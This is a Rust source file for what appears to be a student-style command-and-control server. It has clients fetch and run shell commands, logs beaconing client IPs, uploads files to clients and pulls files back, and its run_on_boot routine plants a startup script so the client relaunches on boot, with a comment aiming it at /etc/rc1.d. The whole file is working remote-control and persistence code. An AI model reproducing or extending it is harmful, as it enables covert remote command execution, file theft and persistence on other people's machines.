use std::{
    fs::{OpenOptions, File},
    io::{prelude::*, BufReader},
    net::{SocketAddr},
};
use chrono::prelude::*;
use tiny_http::{Response};
use serde::{Serialize, Deserialize};  
use std::process::Command;

/// Request type sent to the client
#[derive(Serialize, Deserialize, Debug, Clone)]
enum OrdreType {
    Commande,
    Fichier,
    GetFichier,
    Vitesse,
    Autre
}

/// Request sent to the client
#[derive(Serialize, Deserialize, Debug)]
struct Ordre {
    ordre: OrdreType,
    arguments: Vec<String>,
}

/// Write in a file all the IP adresses that are already connected to the server one time
fn write_incoming_ip(request: Option<&SocketAddr>) {
    let fp = "./beacon.txt";
    let does_exist = std::path::Path::new(fp).exists();
    if !does_exist {
        File::create(fp).unwrap();
    }
    let mut ip = String::from("Unknown IP");

    match request{
        Some(res) => {
            ip = String::from(res.to_string());
            let temp_ip = String::from(res.to_string());
            let split = temp_ip.split(":");
            let mut compteur = true;
            for l in split{
                if compteur{
                    ip = String::from(l);
                    compteur = false;
                }
            }
            println!("{}", ip);
        },
        None => ()
    }

    let file = File::open(fp).unwrap();
    let reader = BufReader::new(file);
    let mut does_exist = false;

    for line in reader.lines() {
        match line {
            Ok(l) => {
                if l.contains(&ip) {
                    does_exist = true;
                }
            },
            Err(_) => {
                println!("Error reading lines in file");
            }
        }
    }

    if !does_exist{
        let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file"); 
        file_ref.write_all(ip.as_bytes()).expect("Write failed");
        file_ref.write_all(" - active \n".as_bytes()).expect("Write failed");
    }
}

/// Write at every connection logs 
fn write_logs(request: Option<&SocketAddr>){
    let fp = "./logs.txt";
    let does_exist = std::path::Path::new(fp).exists();
    if !does_exist {
        File::create(fp).unwrap();
    }

    let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file");   
    file_ref.write_all("Incoming connection from: ".as_bytes()).expect("Write failed");
    let mut ip = String::from("Unknown IP");

    match request{
        Some(res) => {
            ip = String::from(res.to_string());
        },
        None => ()
    }

    file_ref.write_all(ip.as_bytes()).expect("Write failed");
    file_ref.write_all(" at : ".as_bytes()).expect("Write failed");
    let date_as_string = Utc::now().to_string();
    file_ref.write_all(date_as_string.as_bytes()).expect("Write failed");
    file_ref.write_all("\n".as_bytes()).expect("Write failed");
    println!("Log appended successfully"); 
}


/// Receive the result from a shell command and display it in the terminal
async fn handle_post_request(server: & tiny_http::Server) -> String {
    let request = server.recv();

    match request {
        Ok(mut rq) => {
            if *rq.method() == tiny_http::Method::Post {

                let mut content = String::new();
                rq.as_reader().read_to_string(&mut content).unwrap();
                
                println!("{}", content);
                let response = Response::from_string("POST request received\n");
                rq.respond(response).unwrap();
                return content;
            }
        },
        Err(e) => { println!("{}", e);}
    };
    return "".to_string();
}


/// Send a file to the client via POST response
async fn handle_file_post_request(server: & tiny_http::Server, filename: &str, ordre: OrdreType) -> () {
    let request = server.recv();

    match request {
        Ok(mut rq) => {

            if *rq.method() == tiny_http::Method::Post {

                match ordre {
                    OrdreType::Fichier => {
                        let file = std::fs::File::open(filename).unwrap();

                        let mut response = Response::from_file(file);
                        let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
                        response.add_header(header);
                        rq.respond(response).unwrap();
                    },
                    OrdreType::GetFichier => {
                        let mut file = std::fs::File::create(filename).unwrap();

                        let mut content = rq.as_reader();
                        std::io::copy(&mut content, &mut file).unwrap();

                        let response = Response::from_string("Received file via POST");
                        rq.respond(response).unwrap();
                    },
                    _ => {
                        panic!("Not implemented");
                    }

                }
            }
        },
        Err(e) => { println!("{}", e);  }
    };
}


/// Send a response to the GET request from the client, with a custom request type and arguments as the response body
async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> String {
    let request = server.recv();
    match request {
        Ok(rq) => {

            if *rq.method() == tiny_http::Method::Get {

                println!("Incoming connection from: {:?} \n", rq.remote_addr());
                write_incoming_ip(rq.remote_addr());
                write_logs(rq.remote_addr());

                let bod = Ordre { ordre: ordre.clone(), arguments: arguments.clone() };

                let response = Response::from_string(serde_json::to_string(&bod).unwrap());
                rq.respond(response).unwrap();

                match ordre {
                    OrdreType::Commande => {
                        let pwd = String::from(handle_post_request(&server).await);
                        return pwd;
                    },
                    OrdreType::Fichier | OrdreType::GetFichier => {
                        let filename = arguments[0].as_str();
                        handle_file_post_request(&server, filename, ordre).await;
                    },
                    _ => ()
                }

            }

        },
        Err(e) => { println!("{}", e); }
    };
    return "".to_string();
}

/// Put script.sh in the folder /etc/rc1.d which run cd in this folder and run ./target/debug && ./client
async fn run_on_boot(server: & tiny_http::Server) -> () {
    // Get the result of the shell command pwd ran on the client shell and put it on a string 
    let resultpwd = String::from(send_ordre(&server, OrdreType::Commande, vec![String::from("pwd")]).await);
    
    // Create file demarre.sh 
    let mut demarre_sh = File::create("demarre.sh").expect("Error encountered while creating file!");

    // Write the script to go on the client folder and run cargo run 
    demarre_sh.write_all(b"#!/bin/bash\ncd ").expect("Error while writing to file");
    demarre_sh.write_all(resultpwd.as_bytes())
    .expect("Error while writing to file");
    demarre_sh.write_all(b"cd ./target/debug && ./client").expect("Error while writing to file");
 
    // Add file demarre.sh to the source_file_sh to run mv source_file_sh /etc/rc1.d on client
    let owned_string: String = resultpwd.to_owned();
    let borrowed_string: &str = "/demarre.sh";
    let shorten = &owned_string[0..owned_string.len()-1];
    let mut source_file_sh = String::from(shorten);
    source_file_sh.push_str(borrowed_string);
    
    let folder: &str = "/src/etc/";
    let mut final_string = String::from(shorten);
    final_string.push_str(folder);

    // desti needs to be replaced by "/etc/rc1.d" to run the file on the next boot of the client machine 
    let desti = String::from(final_string);

    // Send demarre.sh 
    send_ordre(&server, OrdreType::Fichier, vec![String::from("demarre.sh")]).await;

    send_ordre(&server, OrdreType::Commande, vec![String::from("mkdir"), String::from(&desti)] ).await;

    send_ordre(&server, OrdreType::Commande, vec![String::from("mv"), String::from(source_file_sh), String::from(desti)] ).await;

    let mut delete_sh_file = Command::new("rm");
    delete_sh_file.arg("demarre.sh");
    delete_sh_file.output().expect("Failed to execute process");
}

/// Launch server side 
#[tokio::main]
async fn main() {
    let server = tiny_http::Server::http("0.0.0.0:8082").unwrap();

    send_ordre(&server, OrdreType::Commande, vec![String::from("ls"), String::from("-l")]).await;
    send_ordre(&server, OrdreType::Commande, vec![String::from("echo"), String::from("Hello World!")]).await;    
    send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;
    send_ordre(&server, OrdreType::GetFichier, vec![String::from("fichier.txt")]).await;
    send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;

    run_on_boot(&server).await;
}